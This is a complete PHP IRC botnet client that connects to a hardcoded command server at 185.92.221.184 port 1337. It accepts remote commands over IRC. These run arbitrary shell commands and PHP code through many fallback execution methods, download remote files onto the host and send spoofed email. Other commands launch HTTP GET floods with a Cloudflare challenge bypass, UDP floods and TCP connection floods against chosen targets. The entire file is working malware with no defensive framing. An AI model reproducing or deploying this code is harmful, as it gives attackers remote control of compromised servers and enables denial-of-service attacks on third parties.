<?php
set_time_limit(0);
error_reporting(E_ALL);

function writableDirectory() {
    if(is_dir('/tmp') && is_writable('/tmp')) return '/tmp';
    if(is_dir('/usr/tmp') && is_writable('/usr/tmp')) return '/usr/tmp';
    if(is_dir('/var/tmp') && is_writable('/var/tmp')) return '/var/tmp';
    if(is_dir($uf = getenv('USERPROFILE')) && is_writable($uf)) return $uf;
    if(is_dir($af = getenv('ALLUSERSPROFILE')) && is_writable($af)) return $af;
    if(is_dir($se = ini_get('session.save_path')) && is_writable($se)) return $se;
    if(is_dir($uploadtmp = ini_get('upload_tmp_dir')) && is_writable($uploadtmp)) return $uploadtmp;
    if(is_dir($envtmp = (getenv('TMP')) ?getenv('TMP') : getenv('TEMP')) && is_writable($envtmp)) return $envtmp;

    return '.';
}

function srvshelL($command) {
    $name=writableDirectory()."\\".uniqid('NJ');
    $n=uniqid('NJ');
    $cmd=(empty($_SERVER['ComSpec']))?'d:\\windows\\system32\\cmd.exe':$_SERVER['ComSpec'];
    win32_create_service(array('service'=>$n,'display'=>$n,'path'=>$cmd,'params'=>"/c $command >\"$name\""));
    win32_start_service($n);
    win32_stop_service($n);
    win32_delete_service($n);
    while(!file_exists($name))sleep(1);
    $exec=file_get_contents($name);
    unlink($name);

    return $exec;
}

function ffishelL($command) {
    $name=writableDirectory()."\\".uniqid('NJ');
    $api=new ffi("[lib='kernel32.dll'] int WinExec(char *APP,int SW);");
    $res=$api->WinExec("cmd.exe /c $command >\"$name\"",0);
    while(!file_exists($name))sleep(1);
    $exec=file_get_contents($name);
    unlink($name);

    return $exec;
}

function comshelL($command,$ws) {
    $exec=$ws->exec("cmd.exe /c $command");
    $so=$exec->StdOut();

    return $so->ReadAll();
}

function perlshelL($command) {
    $perl=new perl();
    ob_start();
    $perl->eval("system(\"$command\")");
    $exec=ob_get_contents();
    ob_end_clean();

    return $exec;
}

function Exe($command) {
    $exec=$output='';
    $dep[]=array('pipe','r');$dep[]=array('pipe','w');
    if(function_exists('passthru')){ob_start();@passthru_($command);$exec=ob_get_contents();ob_clean();ob_end_clean();}
    elseif(function_exists('system')){$tmp=ob_get_contents();ob_clean();@system($command);$output=ob_get_contents();ob_clean();$exec=$tmp;}
    elseif(function_exists('exec')){@exec($command,$output);$output=join("\n",$output);$exec=$output;}
    elseif(function_exists('shell_exec'))$exec=@shell_exec($command);
    elseif(function_exists('popen')){$output=@popen($command,'r');while(!feof($output)){$exec=fgets($output);}pclose($output);}
    elseif(function_exists('proc_open')){$res=@proc_open($command,$dep,$pipes);while(!feof($pipes[1])){$line=fgets($pipes[1]);$output.=$line;}$exec=$output;proc_close($res);}
    elseif(function_exists('win_shell_execute') && strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')$exec=winshelL($command);
    elseif(function_exists('win32_create_service') && strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')$exec=srvshelL($command);
    elseif(extension_loaded('ffi') && strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')$exec=ffishelL($command);
    elseif(extension_loaded('perl'))$exec=perlshelL($command);

    return $exec;
}

class sell {
    var $config = array("server"=>"185.92.221.184", "port"=>"1337", "key"=>"", "prefix"=>"LinuxBots", "maxrand"=>"8", "chan"=>"#Bots", "trigger"=>".", "password"=>"", "auth"=>"*@*");
    var $users = array();

    function start() {
        while(true) {
            if(!($this->conn = fsockopen($this->config['server'],$this->config['port'],$e,$s,30))) $this->start();
            $pass = $this->config['password'];
            $alph = range("0","9");
            $this->send("PASS ".$pass."");
            if(strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') $ident = "Windows";
            else $ident = "Linux";
            $this->send("USER ".$ident." 127.0.0.1 localhost :".php_uname()."");
            $this->set_nick();
            $this->main();
        }
    }

    function main() {
        while(!feof($this->conn)) {
            if(function_exists('stream_select')) {
                $read = array($this->conn);
                $write = NULL;
                $except = NULL;
                $changed = stream_select($read, $write, $except, 30);
                if($changed == 0) {
                    fwrite($this->conn, "PING :lelcomeatme\r\n");
                    $read = array($this->conn);
                    $write = NULL;
                    $except = NULL;
                    $changed = stream_select($read, $write, $except, 30);
                    if($changed == 0) break;
                }
            }

            $this->buf = trim(fgets($this->conn,512));
            $cmd = explode(" ",$this->buf);
            if(substr($this->buf,0,6)=="PING :") { $this->send("PONG :".substr($this->buf,6)); continue; }
            if(isset($cmd[1]) && $cmd[1] =="001") {
                $this->auth($this->config['auth']);
                $this->join($this->config['chan'],$this->config['key']);
                if(strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') $this->join("#Windows");
                else $this->join("#Linux");
                continue;
            }
            if(isset($cmd[1]) && $cmd[1]=="433") { $this->set_nick(); continue; }
            if($this->buf != $old_buf) {
                $mcmd = array();
                $msg = substr(strstr($this->buf," :"),2);
                $msgcmd = explode(" ",$msg);
                $nick = explode("!",$cmd[0]);
                $vhost = explode("@",$nick[1]);
                $vhost = $vhost[1];
                $nick = substr($nick[0],1);
                $host = $cmd[0];
                if($msgcmd[0]==$this->nick) for($i=0;$i<count($msgcmd);$i++) $mcmd[$i] = $msgcmd[$i+1];
                else for($i=0;$i<count($msgcmd);$i++) $mcmd[$i] = $msgcmd[$i];

                if(count($cmd)>2) {
                    switch($cmd[1]) {
                        case "PRIVMSG":
                            if(substr($mcmd[0],0,1)=="-") {
                                switch(substr($mcmd[0],1)) {
                                    case "mail":
                                        if(count($mcmd)>4) {
                                            $header = "From: <".$mcmd[2].">";
                                            if(!mail($mcmd[1],$mcmd[3],strstr($msg,$mcmd[4]),$header)) {
                                                $this->privmsg($this->config['chan'],"[\2mail\2]: failed sending.");
                                            } else {
                                                $this->privmsg($this->config['chan'],"[\2mail\2]: sent.");
                                            }
                                        }
                                    break;

                                    case "dns":
                                        if(isset($mcmd[1])) {
                                            $ip = explode(".",$mcmd[1]);
                                            if(count($ip)==4 && is_numeric($ip[0]) && is_numeric($ip[1]) && is_numeric($ip[2]) && is_numeric($ip[3])) {
                                                $this->privmsg($this->config['chan'],"[\2dns\2]: ".$mcmd[1]." => ".gethostbyaddr($mcmd[1]));
                                            } else {
                                                $this->privmsg($this->config['chan'],"[\2dns\2]: ".$mcmd[1]." => ".gethostbyname($mcmd[1]));
                                            }
                                        }
                                    break;

                                    case "vuln":
                                        $this->privmsg($this->config['chan'], "~http://" . $_SERVER['SERVER_NAME'] . "" . $_SERVER['REQUEST_URI'] . "");
                                    break;

                                    case "uname":
                                        if(@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") {
                                            $safemode = "on";
                                        } else {
                                            $safemode = "off";
                                        }
                                        $this->privmsg($this->config['chan'],"[\2info\2]: " . php_uname() . " (safe: ".$safemode.")");
                                    break;

                                    case "raw":
                                        $this->send(strstr($msg,$mcmd[1]));
                                    break;

                                    case "eval":
                                        ob_start();
                                        eval(strstr($msg,$mcmd[1]));
                                        $exec=ob_get_contents();
                                        ob_end_clean();
                                        $ret = explode("\n",$exec);
                                        for($i=0;$i<count($ret);$i++) if($ret[$i]!=NULL) $this->privmsg($this->config['chan'],"      : ".trim($ret[$i]));
                                    break;

                                    case "exec":
                                        $command = substr(strstr($msg, $mcmd[0]), strlen($mcmd[0]) + 1);
                                        $exec    = exec($command);
                                        $ret     = explode("\n", $exec);
                                        for ($i = 0; $i < count($ret); $i++) if ($ret[$i] != NULL) $this->privmsg($this->config['chan'], "      : " . trim($ret[$i]));
                                    break;

                                    case "cmd":
                                        $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);
                                        $exec = Exe($command);
                                        $ret = explode("\n",$exec);
                                        for($i=0;$i<count($ret);$i++) if($ret[$i]!=NULL) $this->privmsg($this->config['chan'],"      : ".trim($ret[$i]));
                                    break;

                                    case "help":
                                        $this->privmsg($this->config['chan'],"[\2Help!\2]");
                                        $this->privmsg($this->config['chan'],"[\2Uzxy's php bot\2]");
                                        $this->privmsg($this->config['chan'],"[\2For help visit: http://pastebin.com/u/uzxy\2]");
                                    break;

                                    case "server":
                                        if(count($mcmd)>2) {
                                            $this->config['server'] = $mcmd[1];
                                            $this->config['port'] = $mcmd[2];

                                            if(isset($mcmcd[3])) {
                                                $this->config['pass'] = $mcmd[3];
                                                $this->privmsg($this->config['chan'],"[\2Server Update\2]: Server Updated ".$mcmd[1].":".$mcmd[2]." pass: ".$mcmd[3]);
                                            } else {
                                                $this->privmsg($this->config['chan'],"[\2update\2]: switched server to ".$mcmd[1].":".$mcmd[2]);
                                            }

                                            fclose($this->conn);
                                            $this->start();
                                        }
                                    break;

                                    case "download":
                                        if(count($mcmd) > 2) {
                                            if(!$fp = fopen($mcmd[2],"w")) {
                                                $this->privmsg($this->config['chan'],"[\2download\2]: could not open output file.");
                                            } else {
                                                if(!$get = file($mcmd[1])) {
                                                    $this->privmsg($this->config['chan'],"[\2download\2]: could not download \2".$mcmd[1]."\2");
                                                } else {
                                                    for($i=0;$i<=count($get);$i++) {
                                                        fwrite($fp,$get[$i]);
                                                    }
                                                    $this->privmsg($this->config['chan'],"[\2download\2]: file \2".$mcmd[1]."\2 downloaded to \2".$mcmd[2]."\2");
                                                }
                                                fclose($fp);
                                            }
                                        } else { $this->privmsg($this->config['chan'],"[\2download\2]: use .download http://your.host/file /tmp/file"); }
                                    break;

                                    case "get":
                                        if(count($mcmd)>2 && array_key_exists('host', $urlBits = parse_url($mcmd[1]))) {
                                            $endTime = time() + $mcmd[2];
                                            $options = array();

                                            if(count($mcmd)>3) $options['overrideHost'] = $mcmd[3];
                                            if(count($mcmd)>4) $options['overridePort'] = $mcmd[4];

                                            $this->privmsg($this->config['chan'],"[\2HTTP Get Attack Started!\2]");

                                            // FIRST REQUEST IS FULL
                                            $content = $this->get($mcmd[1], $options);

                                            // IF CLOUDFLARE
                                            if(
                                                preg_match('!Set-Cookie: __cfduid=([^;]+)!', $content, $cookieMatches) &&
                                                preg_match('!var t,r,a,f, [^=]+={"([^"]+)"(:)([^}]+)};(.*)$!s', $content, $checkSumMatches) &&
                                                preg_match('!name="jschl_vc" value="([^"]+)"!', $content, $jschl_vc)
                                            ) {
                                                $options = array('headers' => array(
                                                    'Cookie' => '__cfduid=' . urlencode($cookieMatches[1]),
                                                    'Referer' => $mcmd[1]
                                                ));

                                                // SOLVE CF CHALLENGE
                                                $jschl_answer = eval('return ' . str_replace('false+[])+', 'false+\'\').', str_replace('true+[])+', 'true+\'\').', str_replace('++[]', '+0', str_replace('(+[]', '(0', str_replace('!+[]', 'true', str_replace('![]', 'false', $checkSumMatches[3])))))) . ';');
                                                while(preg_match('!(' . $checkSumMatches[1] . ')(.)=([^0-9]+?);(.*)!s', $checkSumMatches[4], $checkSumMatches)) {
                                                    eval('$jschl_answer ' . $checkSumMatches[2] . '= ' . eval('return ' . str_replace('false+[])+', 'false+\'\').', str_replace('true+[])+', 'true+\'\').', str_replace('++[]', '+0', str_replace('(+[]', '(0', str_replace('!+[]', 'true', str_replace('![]', 'false', $checkSumMatches[3])))))) . ';') . ';');
                                                }
                                                $jschl_answer += strlen($urlBits['host']);

                                                // RETRIEVE CLEARANCE COOKIE
                                                if(preg_match('!Set-Cookie: cf_clearance=([^;]+)!', $this->get('http://' . $urlBits['host'] . '/cdn-cgi/l/chk_jschl?jschl_vc=' . $jschl_vc[1] . '&jschl_answer=' . $jschl_answer, $options), $cookieMatches1)) {
                                                    $options['headers']['Cookie'] .= '; cf_clearance=' . $cookieMatches1[1];
                                                }

                                                // OR ABORT SPECIAL CF TREATMENT IF FAILED
                                                else {
                                                    $options = array();
                                                }
                                            }

                                            // SET FINAL DDOS OPTIONS
                                            $options['returnContent'] = false;

                                            $i = 1;
                                            while($endTime > time()) {
                                                $this->get($mcmd[1], $options);

                                                $i++;
                                            }
                                            $this->privmsg($this->config['chan'],"[\2HTTP Get Attack Finished!\2]: sent " . $i . " requests to " . $mcmd[1]);
                                        }
                                    break;

                                    case "udp":
                                        if(count($mcmd)>3) { $this->udp($mcmd[1],$mcmd[2],$mcmd[3]); }
                                    break;

                                    case "udpflood":
                                        if(count($mcmd)>4) { $this->udpflood($mcmd[1],$mcmd[2],$mcmd[3],$mcmd[4]); }
                                    break;

                                    case "tcpconn":
                                        if(count($mcmd)>3) { $this->tcpconn($mcmd[1],$mcmd[2],$mcmd[3]); }
                                    break;

                                    case "die":
                                       if(count($mcmd)>0) { fclose($this->conn); exit();}
                                    break;
                                }
                            }
                        break;
                    }
                }
            }
        }
    }

    function send($msg) {
        fwrite($this->conn,$msg."\r\n");
    }

    function join($chan,$key=NULL) {
        $this->send("JOIN ".$chan." ".$key);
    }

    function auth($chan) {
        $this->send("PART ".$chan);
    }

    function privmsg($to,$msg) {
        $this->send("PRIVMSG ".$to." :".$msg);
    }

    function notice($to,$msg) {
        $this->send("NOTICE ".$to." :".$msg);
    }

    function set_nick() {
        $prefix = "LinuxBots-%s";
        $nickk = substr(str_shuffle("1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, $this->config['maxrand']);
        $this->nick = sprintf($prefix, $nickk);
        $this->send("NICK ".$this->nick);
    }

    function udp($host,$port,$time) {
        $packetsize = 65500;
        $this->privmsg($this->config['chan'],"[\2UDP Attack Started!\2]");
        $packet = "";
        for($i=0;$i<$packetsize;$i++) { $packet .= chr(rand(1,256)); }
        $end = time() + $time;
        $i = 0;
        $fp = fsockopen("udp://".$host,$port,$e,$s,5);
        while(true) {
            fwrite($fp,$packet);
            fflush($fp);
            if($i % 100 == 0) {
                if($end < time()) break;
            }
            $i++;
        }
        fclose($fp);
        $env = $i * $packetsize;
        $env = $env / 1048576;
        $vel = $env / $time;
        $vel = round($vel);
        $env = round($env);
        $this->privmsg($this->config['chan'],"[\2UDP Attack Finished!\2]: ".$env." MB sent / Average: ".$vel." MB/s ");
    }

    function udpflood($host,$port,$time,$packetsize) {
        $this->privmsg($this->config['chan'],"[\2UDPFLOOD Started!\2]");
        $packet = "";
        for($i=0;$i<$packetsize;$i++) { $packet .= chr(rand(1,256)); }
        $end = time() + $time;
        $multitarget = false;
        if(strpos($host, ",") !== FALSE) {
            $multitarget = true;
            $host = explode(",", $host);
        }
        $i = 0;
        if($multitarget) {
            $fp = array();
            foreach($host as $hostt) $fp[] = fsockopen("udp://".$hostt,$port,$e,$s,5);

            $count = count($host);
            while(true) {
                fwrite($fp[$i % $count],$packet);
                fflush($fp[$i % $count]);
                if($i % 100 == 0) {
                    if($end < time()) break;
                }
                $i++;
            }

            foreach($fp as $fpp) fclose($fpp);
        } else {
            $fp = fsockopen("udp://".$host,$port,$e,$s,5);
            while(true) {
                fwrite($fp,$packet);
                fflush($fp);
                if($i % 100 == 0) {
                    if($end < time()) break;
                }
                $i++;
            }
            fclose($fp);
        }
        $env = $i * $packetsize;
        $env = $env / 1048576;
        $vel = $env / $time;
        $vel = round($vel);
        $env = round($env);
        $this->privmsg($this->config['chan'],"[\2UDPFlood Finished!\2]: ".$env." MB sent / Average: ".$vel." MB/s ");
    }

    function tcpconn($host, $port, $time) {
        $this->privmsg($this->config['chan'],"[\2TcpConn Started!\2]");
        $end = time() + $time;
        $i = 0;
        while($end > time()) {
            fclose(fsockopen($host, $port, $dummy, $dummy, 1));
            $i++;
        }

        $this->privmsg($this->config['chan'], "[\2TcpFlood Finished!\2]: sent " . $i . " connections to $host:$port.");
    }

    function extend($paArray1, $paArray2) {
        if(!is_array($paArray1) or !is_array($paArray2)) return $paArray2;

        foreach($paArray2 AS $sKey2 => $sValue2) {
            $paArray1[$sKey2] = $this->extend(@$paArray1[$sKey2], $sValue2);
        }

        return $paArray1;
    }

    function get($url, $options = array()) {
        $url = $this->extend(array(
            'host' => 'google.de',
            'port' => 80,
            'path' => '/',
            'query' => null
        ), parse_url($url));

        $options = $this->extend(array(
            'headers' => array(
                'Host' => $url['host'],
                'User-Agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36'
            ),
            'returnContent' => true,
            'overrideHost' => null,
            'overridePort' => null
        ), $options);

        if($fp = fsockopen($options['overrideHost'] ? $options['overrideHost'] : $url['host'], $options['overridePort'] ? $options['overridePort'] : $url['port'], $errno, $errstr, 30)) {
            $protocolBits = array('GET ' . $url['path'] . ($url['query'] ? '?' . $url['query'] : '') . ' HTTP/1.1');
            foreach($options['headers'] as $key => $value) {
                $protocolBits[] = is_array($value) ? $key . ': ' . implode(', ', $value) : $key . ': ' . $value;
            }
            $protocolBits[] = 'Connection: Close';

            fwrite($fp, implode("\r\n", $protocolBits) . "\r\n\r\n");

            $content = '';
            if($options['returnContent']) {
                while(!feof($fp)) $content .= fread($fp, 128);
            }

            fclose($fp);

            return $content;
        }

        return false;
    }
}

$poll = new sell;
$poll->start();
?>